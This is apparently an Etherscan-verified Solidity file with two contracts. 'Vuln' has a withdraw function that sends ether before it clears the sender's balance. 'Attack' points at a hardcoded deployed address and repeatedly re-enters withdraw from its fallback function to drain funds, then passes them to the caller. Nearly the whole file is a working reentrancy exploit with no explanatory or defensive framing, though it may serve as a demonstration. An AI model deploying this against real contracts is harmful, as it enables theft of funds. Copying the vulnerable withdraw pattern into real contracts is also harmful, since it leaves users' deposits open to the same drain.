/**
 *Submitted for verification at Etherscan.io on 2022-12-02
*/

pragma solidity ^0.6.0;

contract Vuln {
    mapping(address => uint256) public balances;
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    function withdraw() public {
        msg.sender.call.value(balances[msg.sender])("");
        balances[msg.sender] = 0;
    }
}

contract Attack {
    Vuln vuln;
    constructor() public {
        vuln = Vuln(address(0xEB81D9a87BbbBf4066be04AdDaDbF03410F1F58d));
    }
    fallback() external payable {
        if (address(this).balance < 0.2 ether) {
            vuln.withdraw();
        }
    }
    function attack() external payable {
        vuln.deposit.value(msg.value)();
        vuln.withdraw();
    }
    function receiveEther() public {
        msg.sender.transfer(address(this).balance);
    }
}